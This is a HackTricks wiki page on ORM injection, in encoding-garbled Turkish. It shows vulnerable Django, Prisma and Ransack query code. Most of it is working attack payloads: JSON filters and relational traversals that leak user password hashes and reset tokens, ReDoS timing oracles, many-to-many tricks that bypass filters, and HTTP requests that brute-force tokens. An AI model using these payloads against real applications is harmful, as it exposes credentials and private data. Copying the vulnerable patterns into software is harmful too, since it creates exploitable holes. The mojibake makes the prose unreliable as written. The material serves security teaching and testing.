# ORM Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Django ORM (Python)

In [**this post**](https://www.elttam.com/blog/plormbing-your-django-orm/) nasÄ±l bir Django ORM'nin, Ã¶rneÄŸin aÅŸaÄŸÄ±daki gibi bir kod kullanÄ±larak savunmasÄ±z hale getirilebileceÄŸi aÃ§Ä±klanmaktadÄ±r:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
KullanÄ±cÄ±larÄ±n makaleleri aramak iÃ§in istek gÃ¶nderdiÄŸi bazÄ± temel API gÃ¶rÃ¼nÃ¼mÃ¼
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

TÃ¼m request.data'nÄ±n (bu bir json olacaktÄ±r) doÄŸrudan **veritabanÄ±ndan nesneleri filtrelemek iÃ§in** geÃ§irildiÄŸine dikkat edin. Bir saldÄ±rgan, beklenenden daha fazla veri sÄ±zdÄ±rmak iÃ§in beklenmedik filtreler gÃ¶nderebilir.

Ã–rnekler:

* **GiriÅŸ:** Basit bir giriÅŸte, iÃ§indeki kayÄ±tlÄ± kullanÄ±cÄ±larÄ±n ÅŸifrelerini sÄ±zdÄ±rmaya Ã§alÄ±ÅŸÄ±n.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
Åifreyi brute-force ile kÄ±rmak, sÄ±zdÄ±rÄ±lana kadar mÃ¼mkÃ¼ndÃ¼r.
{% endhint %}

* **Ä°liÅŸkisel filtreleme**: Ä°ÅŸlemde kullanÄ±lacaÄŸÄ± bile beklenmeyen sÃ¼tunlardan bilgi sÄ±zdÄ±rmak iÃ§in iliÅŸkileri geÃ§mek mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, bu iliÅŸkilerle bir kullanÄ±cÄ± tarafÄ±ndan oluÅŸturulan makaleleri sÄ±zdÄ±rmak mÃ¼mkÃ¼nse: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
TÃ¼m makale oluÅŸturmuÅŸ kullanÄ±cÄ±larÄ±n ÅŸifrelerini bulmak mÃ¼mkÃ¼ndÃ¼r.
{% endhint %}

* **Ã‡oktan Ã§oÄŸa iliÅŸkisel filtreleme**: Ã–nceki Ã¶rnekte, makale oluÅŸturmamÄ±ÅŸ kullanÄ±cÄ±larÄ±n ÅŸifrelerini bulamadÄ±k. Ancak, diÄŸer iliÅŸkileri takip ederek bu mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
Bu durumda, makaleler oluÅŸturan kullanÄ±cÄ±larÄ±n departmanlarÄ±ndaki tÃ¼m kullanÄ±cÄ±larÄ± bulabiliriz ve ardÄ±ndan ÅŸifrelerini sÄ±zdÄ±rabiliriz (Ã¶nceki json'da yalnÄ±zca kullanÄ±cÄ± adlarÄ±nÄ± sÄ±zdÄ±rÄ±yoruz ama daha sonra ÅŸifreleri sÄ±zdÄ±rmak mÃ¼mkÃ¼n).
{% endhint %}

* **Django Grup ve Ä°zinlerinin kullanÄ±cÄ±larla olan Ã§oktan Ã§oÄŸa iliÅŸkilerini kÃ¶tÃ¼ye kullanma**: AyrÄ±ca, AbstractUser modeli Django'da kullanÄ±cÄ±larÄ± oluÅŸturmak iÃ§in kullanÄ±lÄ±r ve varsayÄ±lan olarak bu modelin **Ä°zin ve Grup tablolarÄ±yla bazÄ± Ã§oktan Ã§oÄŸa iliÅŸkileri** vardÄ±r. Bu, temelde **aynÄ± grupta bulunan veya aynÄ± izni paylaÅŸan bir kullanÄ±cÄ±dan diÄŸer kullanÄ±cÄ±lara eriÅŸmenin varsayÄ±lan yoludur**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **Filtre kÄ±sÄ±tlamalarÄ±nÄ± atlama**: AynÄ± blog yazÄ±sÄ±, `articles = Article.objects.filter(is_secret=False, **request.data)` gibi bazÄ± filtrelerin kullanÄ±mÄ±nÄ± atlamayÄ± Ã¶nerdi. is\_secret=True olan makaleleri dÃ¶kme olasÄ±lÄ±ÄŸÄ± vardÄ±r Ã§Ã¼nkÃ¼ bir iliÅŸkiden Article tablosuna geri dÃ¶nebiliriz ve gizli makaleleri gizli olmayan makalelerden sÄ±zdÄ±rabiliriz Ã§Ã¼nkÃ¼ sonuÃ§lar birleÅŸtirilmiÅŸtir ve is\_secret alanÄ± gizli olmayan makalede kontrol edilirken veri gizli makaleden sÄ±zdÄ±rÄ±lmaktadÄ±r.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
Ä°liÅŸkileri kÃ¶tÃ¼ye kullanarak, gÃ¶sterilen verileri korumak iÃ§in tasarlanmÄ±ÅŸ filtreleri bile atlatmak mÃ¼mkÃ¼ndÃ¼r.
{% endhint %}

* **Hata/Zaman bazlÄ± ReDoS ile**: Ã–nceki Ã¶rneklerde, filtrelemenin Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±na gÃ¶re farklÄ± yanÄ±tlar alÄ±nmasÄ± bekleniyordu ve bu, oracle olarak kullanÄ±lacaktÄ±. Ancak, veritabanÄ±nda bazÄ± iÅŸlemler yapÄ±ldÄ±ÄŸÄ±nda yanÄ±tÄ±n her zaman aynÄ± olmasÄ± mÃ¼mkÃ¼n olabilir. Bu senaryoda, yeni bir oracle elde etmek iÃ§in veritabanÄ± hatasÄ± oluÅŸturmak mÃ¼mkÃ¼n olabilir.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
AynÄ± gÃ¶nderiden bu vektÃ¶rle ilgili:

* **SQLite**: VarsayÄ±lan olarak bir regexp operatÃ¶rÃ¼ne sahip deÄŸildir (Ã¼Ã§Ã¼ncÃ¼ taraf bir uzantÄ±nÄ±n yÃ¼klenmesi gerekir)
* **PostgreSQL**: VarsayÄ±lan bir regex zaman aÅŸÄ±mÄ±na sahip deÄŸildir ve geri izlemeye daha az eÄŸilimlidir
* **MariaDB**: Bir regex zaman aÅŸÄ±mÄ±na sahip deÄŸildir

## Prisma ORM (NodeJS)

AÅŸaÄŸÄ±dakiler [**bu gÃ¶nderiden Ã§Ä±karÄ±lan ipuÃ§larÄ±dÄ±r**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

* **Tam bulma kontrolÃ¼**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// SaldÄ±rganÄ±n tÃ¼m prisma seÃ§enekleri Ã¼zerinde tam kontrolÃ¼ vardÄ±r
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

TÃ¼m javascript gÃ¶vdesinin sorgular gerÃ§ekleÅŸtirmek iÃ§in prisma'ya geÃ§irildiÄŸi gÃ¶rÃ¼lebilir.

Orijinal gÃ¶nderideki Ã¶rnekte, bu, birisi tarafÄ±ndan oluÅŸturulan tÃ¼m gÃ¶nderileri kontrol eder (her gÃ¶nderi birisi tarafÄ±ndan oluÅŸturulur) ve o kiÅŸinin kullanÄ±cÄ± bilgilerini (kullanÄ±cÄ± adÄ±, ÅŸifre...) de dÃ¶ndÃ¼rÃ¼r.
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
AÅŸaÄŸÄ±daki, bir ÅŸifreye sahip olan birinin oluÅŸturduÄŸu tÃ¼m gÃ¶nderileri seÃ§er ve ÅŸifreyi dÃ¶ndÃ¼recektir:
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **Tam where ifadesi kontrolÃ¼**:

SaldÄ±rÄ±nÄ±n `where` ifadesini kontrol edebileceÄŸi duruma bir gÃ¶z atalÄ±m:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // ORM Leak'lerine karÅŸÄ± savunmasÄ±z
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

KullanÄ±cÄ±larÄ±n ÅŸifrelerini doÄŸrudan filtrelemek mÃ¼mkÃ¼ndÃ¼r:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
`startsWith` gibi iÅŸlemler kullanarak bilgi sÄ±zdÄ±rmak mÃ¼mkÃ¼ndÃ¼r.&#x20;
{% endhint %}

* **Ã‡oktan Ã§oÄŸa iliÅŸkisel filtreleme ile filtrelemeyi atlama:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
`Category` -\[\*..\*]-> `Article` arasÄ±ndaki Ã§oktan Ã§oÄŸa iliÅŸkileri kullanarak yayÄ±mlanmamÄ±ÅŸ makaleleri sÄ±zdÄ±rmak mÃ¼mkÃ¼ndÃ¼r:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
AynÄ± zamanda bazÄ± dÃ¶ngÃ¼sel Ã§oktan Ã§oÄŸa iliÅŸkileri kÃ¶tÃ¼ye kullanarak tÃ¼m kullanÄ±cÄ±larÄ± sÄ±zdÄ±rmak da mÃ¼mkÃ¼ndÃ¼r:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **Hata/ZamanlÄ± sorgular**: Orijinal yazÄ±da, zaman tabanlÄ± bir yÃ¼k ile bilgi sÄ±zdÄ±rmak iÃ§in optimal yÃ¼kÃ¼ bulmak amacÄ±yla gerÃ§ekleÅŸtirilen Ã§ok kapsamlÄ± bir test setini okuyabilirsiniz. Bu ÅŸudur:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Where the `{CONTAINS_LIST}` is a list with 1000 strings to make sure the **yanÄ±tÄ±n doÄŸru leak bulunduÄŸunda geciktiÄŸinden emin olmak iÃ§in.**

## **Ransack (Ruby)**

These tricks where [**found in this post**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**Ransack 4.0.0.0'Ä±n artÄ±k aranabilir nitelikler ve iliÅŸkiler iÃ§in aÃ§Ä±k bir izin listesi kullanÄ±mÄ±nÄ± zorunlu kÄ±ldÄ±ÄŸÄ±nÄ± unutmayÄ±n.**
{% endhint %}

**ZayÄ±f Ã¶rnek:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
Not edin ki sorgu, saldÄ±rgan tarafÄ±ndan gÃ¶nderilen parametrelerle tanÄ±mlanacaktÄ±r. Ã–rneÄŸin, sÄ±fÄ±rlama token'Ä±nÄ± brute-force yapmak mÃ¼mkÃ¼n oldu:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
Brute-forcing ve potansiyel iliÅŸkilerle, bir veritabanÄ±ndan daha fazla veri sÄ±zdÄ±rmak mÃ¼mkÃ¼n oldu.

## References

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
